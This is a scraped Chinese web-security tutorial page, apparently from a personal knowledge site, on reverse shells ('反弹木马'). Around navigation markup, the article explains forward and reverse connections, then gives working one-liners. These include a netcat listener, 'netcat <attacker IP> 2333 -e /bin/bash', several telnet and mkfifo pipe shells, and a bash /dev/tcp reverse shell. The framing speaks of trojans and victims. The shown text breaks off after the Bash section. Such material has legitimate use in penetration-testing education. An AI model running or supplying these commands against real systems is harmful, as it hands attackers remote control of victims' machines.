left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->等保测评<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/数据库安全.svg" alt="item-icon"><span class="series-item-text">数据库安全</span><span class="arrow right"></span></h5><ul id="4" style="height:0rem;"><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/MySQL.svg" alt="item-icon"><span class="series-item-text">MySQL</span><span class="arrow right"></span></h5><ul id="4.0" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/DatabasesSecurity/MySQL/install.html" class="link series-item" aria-label="环境搭建"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->环境搭建<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/DatabasesSecurity/MySQL/basicKnowledge.html" class="link series-item" aria-label="基础知识"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->基础知识<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/MsSQL.svg" alt="item-icon"><span class="series-item-text">MsSQL</span><span class="arrow right"></span></h5><ul id="4.1" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/DatabasesSecurity/MsSQL/basicKnowledge.html" class="link series-item" aria-label="基础知识"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->基础知识<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/Redis.svg" alt="item-icon"><span class="series-item-text">Reids</span><span class="arrow right"></span></h5><ul id="4.2" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/DatabasesSecurity/Redis/install.html" class="link series-item" aria-label="环境搭建"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->环境搭建<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/DatabasesSecurity/Redis/basicKnowledge.html" class="link series-item" aria-label="基础知识"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->基础知识<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li></ul></section><!--]--><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/云原生安全.svg" alt="item-icon"><span class="series-item-text">云原生安全</span><span class="arrow right"></span></h5><ul id="5" style="height:0rem;"><li><!--[--><section class="series-group series-item"><h5 class="series-heading"><img style="display:inline-flex;" class="item-icon" src="/icons/云原生技术.svg" alt="item-icon"><span class="series-item-text">云原生技术</span><span class="arrow right"></span></h5><ul id="5.0" style="height:0rem;"><li><!--[--><a href="/docs/NetworkSecurity/CloudNativeSecurity/CloudNativeTechnology/containerTechnology.html" class="link series-item" aria-label="容器技术"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->容器技术<!--]--></span></span><!--[--><!--]--></a><!--]--></li><li><!--[--><a href="/docs/NetworkSecurity/CloudNativeSecurity/CloudNativeTechnology/microServices.html" class="link series-item" aria-label="微服务"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->微服务<!--]--></span></span><!--[--><!--]--></a><!--]--></li></ul></section><!--]--></li></ul></section><!--]--><!--]--></div><div style="display:none;"><div class="catalog"><div class="catalog-container"><!-- <h5 class="tip">{{ catalogTitle }}</h5> --><div class="page-catalog-container"><ul><!--[--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#正向连接" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="正向连接"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->正向连接<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#反向连接" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="反向连接"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->反向连接<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#利用-netcat-反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="利用 netcat 反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->利用 netcat 反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#安装" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="安装"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->安装<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#攻击机开启本地监听" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="攻击机开启本地监听"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->攻击机开启本地监听<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#目标机主动连接攻击机" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="目标机主动连接攻击机"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->目标机主动连接攻击机<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#利用-bash-反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="利用 Bash 反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->利用 Bash 反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#命令" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="命令"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->命令<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#攻击机开启本地监听-1" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="攻击机开启本地监听"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->攻击机开启本地监听<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#目标机主动连接攻击机-1" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="目标机主动连接攻击机"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->目标机主动连接攻击机<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#tcp-协议-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="TCP 协议 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->TCP 协议 shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#udp-协议-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="UDP 协议 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->UDP 协议 shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#curl-配合-bash-反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="Curl 配合 Bash 反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Curl 配合 Bash 反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#利用-socat-反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="利用 Socat 反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->利用 Socat 反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#攻击机开启本地监听-2" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="攻击机开启本地监听"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->攻击机开启本地监听<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#目标机主动连接攻击机-2" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="目标机主动连接攻击机"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->目标机主动连接攻击机<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#利用-telnet-反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="利用 Telnet 反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->利用 Telnet 反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#攻击机开启本地监听-3" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="攻击机开启本地监听"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->攻击机开启本地监听<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#目标机主动连接攻击机-3" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="目标机主动连接攻击机"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->目标机主动连接攻击机<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#攻击机需要开启两个本地监听" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="攻击机需要开启两个本地监听"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->攻击机需要开启两个本地监听<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#目标机主动连接攻击机-4" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="目标机主动连接攻击机"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->目标机主动连接攻击机<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#各种脚本反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="各种脚本反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->各种脚本反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#python-脚本反弹shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="Python 脚本反弹shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Python 脚本反弹shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#php-脚本反弹shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="php 脚本反弹shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->php 脚本反弹shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#perl-脚本反弹shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="Perl 脚本反弹shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Perl 脚本反弹shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#ruby脚本反弹shel" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="Ruby脚本反弹shel"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->Ruby脚本反弹shel<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#使用-metasploit-生成反弹-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="使用 Metasploit 生成反弹 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->使用 Metasploit 生成反弹 shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#反弹-shell-后获取模拟终端" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="反弹 shell 后获取模拟终端"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->反弹 shell 后获取模拟终端<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_2"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#使用openssl反弹加密shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="使用OpenSSL反弹加密shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->使用OpenSSL反弹加密shell<!--]--></span></span><!--[--><!--]--></a></li><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#openssl-简介" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="OpenSSL 简介"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->OpenSSL 简介<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--[--><li class="page-catalog-menu-depth_3"><a aria-current="page" href="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html#使用-openssl-反弹加密-shell" class="router-link-active router-link-exact-active link page-catalog-item" aria-label="使用 OpenSSL 反弹加密 shell"><!--[--><!--]--><span class="xicon-container left"><!--[--><!----><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->使用 OpenSSL 反弹加密 shell<!--]--></span></span><!--[--><!--]--></a></li><!--]--><!--]--><!--]--></ul></div></div></div></div></div><div class="series-resizer-container"><div class="series-resizer-bar"></div></div></aside><div class="series-container-bar-pannel"></div><div class="series-background"></div><!--]--><!--[--><main class="page-container"><div><div class="page-hero-image"><!----></div><div class="page-title-container"><!----><h1 class="page-title">反弹木马<span class="blinker"></span></h1></div><div class="page-info"><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M16 4a5 5 0 1 1-5 5a5 5 0 0 1 5-5m0-2a7 7 0 1 0 7 7a7 7 0 0 0-7-7z" fill="currentColor"></path><path d="M26 30h-2v-5a5 5 0 0 0-5-5h-6a5 5 0 0 0-5 5v5H6v-5a7 7 0 0 1 7-7h6a7 7 0 0 1 7 7z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->YOUZAI<!--]--></span></span><span class="xicon-container left" id="calendar"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M26 4h-4V2h-2v2h-8V2h-2v2H6c-1.1 0-2 .9-2 2v20c0 1.1.9 2 2 2h20c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 22H6V12h20v14zm0-16H6V6h4v2h2V6h8v2h2V6h4v4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->2023/06/21<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M11.17 6l3.42 3.41l.58.59H28v16H4V6h7.17m0-2H4a2 2 0 0 0-2 2v20a2 2 0 0 0 2 2h24a2 2 0 0 0 2-2V10a2 2 0 0 0-2-2H16l-3.41-3.41A2 2 0 0 0 11.17 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->WEB安全<!--]--></span></span><span class="xicon-container left"><!--[--><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 32 32" class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;"><path d="M10 14a4 4 0 1 1 4-4a4.005 4.005 0 0 1-4 4zm0-6a2 2 0 1 0 1.998 2.004A2.002 2.002 0 0 0 10 8z" fill="currentColor"></path><path d="M16.644 29.415L2.586 15.354A2 2 0 0 1 2 13.941V4a2 2 0 0 1 2-2h9.941a2 2 0 0 1 1.414.586l14.06 14.058a2 2 0 0 1 0 2.828l-9.943 9.943a2 2 0 0 1-2.829 0zM4 4v9.942L18.058 28L28 18.058L13.942 4z" fill="currentColor"></path></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[-->安全技术<!--]--></span></span><span class="xicon-container left"><!--[--><svg class="xicon-icon" style="width:18px;height:18px;font-size:18px;color:inherit;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 12 12"><g fill="none"><path d="M1.974 6.659a.5.5 0 0 1-.948-.317c-.01.03 0-.001 0-.001a1.633 1.633 0 0 1 .062-.162c.04-.095.099-.226.18-.381c.165-.31.422-.723.801-1.136C2.834 3.827 4.087 3 6 3c1.913 0 3.166.827 3.931 1.662a5.479 5.479 0 0 1 .98 1.517l.046.113c.003.008.013.06.023.11L11 6.5s.084.333-.342.474a.5.5 0 0 1-.632-.314v-.003l-.006-.016a3.678 3.678 0 0 0-.172-.376a4.477 4.477 0 0 0-.654-.927C8.584 4.673 7.587 4 6 4s-2.584.673-3.194 1.338a4.477 4.477 0 0 0-.795 1.225a2.209 2.209 0 0 0-.03.078l-.007.018zM6 5a2 2 0 1 0 0 4a2 2 0 0 0 0-4zM5 7a1 1 0 1 1 2 0a1 1 0 0 1-2 0z" fill="currentColor"></path></g></svg><!--]--><span class="xicon-content" style="color:inherit;font-size:14px;"><!--[--><span id="/docs/NetworkSecurity/WebSecurity/SecurityTechnology/bounceTrojan.html" class="leancloud-visitors" data-flag-title="Your Article Title"><a class="leancloud-visitors-count" style=""></a></span><!----><!--]--></span></span></div><div class="theme-reco-default-content"><div><h2 id="正向连接" tabindex="-1"><a class="header-anchor" href="#正向连接" aria-hidden="true">#</a> 正向连接</h2><p>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标 ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面、web 服务、ssh、telnet 等等都是正向连接。</p><h2 id="反向连接" tabindex="-1"><a class="header-anchor" href="#反向连接" aria-hidden="true">#</a> 反向连接</h2><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">总结</p><p>反弹 shell 通常适用于如下几种情况：</p><ul><li>目标机因防火墙受限，目标机器只能发送请求，不能接收请求。</li><li>目标机端口被占用。</li><li>目标机位于局域网，或IP会动态变化，攻击机无法直接连接。</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知的。</li></ul></div><p>对于以上几种情况，我们是无法利用正向连接的，要用反向连接。</p><blockquote><p>那么反向连接就很好理解了，就是攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，即为反向连接。反弹 shell 的方式有很多，那具体要用哪种方式还需要根据目标主机的环境来确定，比如目标主机上如果安装有 netcat，那我们就可以利用 netcat 反弹 shell，如果具有 python 环境，那我们可以利用 python 反弹 shell。如果具有 php 环境，那我们可以利用 php 反弹 shell。</p></blockquote><h2 id="利用-netcat-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-netcat-反弹-shell" aria-hidden="true">#</a> 利用 netcat 反弹 shell</h2><p>Netcat 是一款简单的 Unix 工具，使用 UDP 和 TCP 协议。它是一个可靠的容易被其他程序所启用的后台操作工具，同时它也被用作网络的测试工具或黑客工具。使用它你可以轻易的建立任何连接。</p><div class="custom-container tip"><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="9"></circle><path d="M12 8h.01"></path><path d="M11 12h1v4h1"></path></g></svg><p class="custom-container-title">提示</p><p>目前，默认的各个 linux 发行版本已经自带了 netcat 工具包，但是可能由于处于安全考虑原生版本的 netcat 带有可以直接发布与反弹本地 shell 的功能参数 -e 都被阉割了，所以我们需要自己手动下载二进制安装包，</p></div><h3 id="安装" tabindex="-1"><a class="header-anchor" href="#安装" aria-hidden="true">#</a> 安装</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">wget</span> https://nchc.dl.sourceforge.net/project/netcat/netcat/0.7.1/netcat-0.7.1.tar.gz
<span class="token function">tar</span> <span class="token parameter variable">-xvzf</span> netcat-0.7.1.tar.gz
./configure
<span class="token function">make</span> <span class="token operator">&amp;&amp;</span> <span class="token function">make</span> <span class="token function">install</span>
<span class="token function">make</span> clean
</code></pre></div><p>安装完原生版本的 netcat 工具后，便有了<code>netcat -e</code>参数，我们就可以将本地 bash 反弹到攻击机上了。</p><h3 id="攻击机开启本地监听" tabindex="-1"><a class="header-anchor" href="#攻击机开启本地监听" aria-hidden="true">#</a> 攻击机开启本地监听</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>netcat <span class="token parameter variable">-lvvp</span> <span class="token number">2333</span>
</code></pre></div><h3 id="目标机主动连接攻击机" tabindex="-1"><a class="header-anchor" href="#目标机主动连接攻击机" aria-hidden="true">#</a> 目标机主动连接攻击机</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>netcat <span class="token number">47</span>.xxx.xxx.72 <span class="token number">2333</span> <span class="token parameter variable">-e</span> /bin/bash

<span class="token comment"># nc &lt;攻击机IP&gt; &lt;攻击机监听的端口&gt; -e /bin/bash</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> /tmp/p<span class="token punctuation">;</span> <span class="token function">mknod</span> /tmp/p p <span class="token operator">&amp;&amp;</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token number">0</span>/tmp/p <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code>telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">|</span> /bin/bash <span class="token operator">|</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span>
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> f<span class="token punctuation">;</span><span class="token function">mkfifo</span> f<span class="token punctuation">;</span><span class="token function">cat</span> f<span class="token operator">|</span>/bin/sh <span class="token parameter variable">-i</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span><span class="token operator">|</span>telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator">&gt;</span> f
</code></pre></div><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">rm</span> <span class="token parameter variable">-f</span> x<span class="token punctuation">;</span> <span class="token function">mknod</span> x p <span class="token operator">&amp;&amp;</span> telnet <span class="token number">192.168</span>.128.128 <span class="token number">9999</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>x <span class="token operator">|</span> /bin/bash <span class="token operator"><span class="token file-descriptor important">1</span>&gt;</span>x
</code></pre></div><p>执行效果如下：</p><p><img src="/images/image20210424123848.png" alt=""></p><h2 id="利用-bash-反弹-shell" tabindex="-1"><a class="header-anchor" href="#利用-bash-反弹-shell" aria-hidden="true">#</a> 利用 Bash 反弹 shell</h2><h3 id="命令" tabindex="-1"><a class="header-anchor" href="#命令" aria-hidden="true">#</a> 命令</h3><div class="language-bash" data-ext="sh"><pre class="language-bash"><code><span class="token function">bash</span> <span class="token parameter variable">-i</span> <span class="token operator">&gt;&amp;</span> /dev/tcp/47.xxx.xxx.72/2333 <span class="token operator"><span class="token file-descriptor important">0</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
或
<span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">&quot;bash -i &gt;&amp; /dev/tcp/47.xxx.xxx.72/2333 0&gt;&amp;1&quot;</span>
<span class="token comment"># bash -i &gt;&amp; /dev/tcp/攻击机IP/攻击机端口 0&gt;&amp;1</span>
